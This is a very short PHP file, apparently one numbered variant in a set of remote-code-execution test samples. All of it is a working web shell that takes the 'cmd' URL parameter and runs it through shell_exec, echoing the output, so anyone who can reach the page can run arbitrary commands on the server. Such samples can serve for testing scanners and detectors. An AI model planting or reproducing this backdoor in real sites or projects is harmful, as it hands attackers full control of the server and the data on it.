<?php
// RCE test variation #836
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>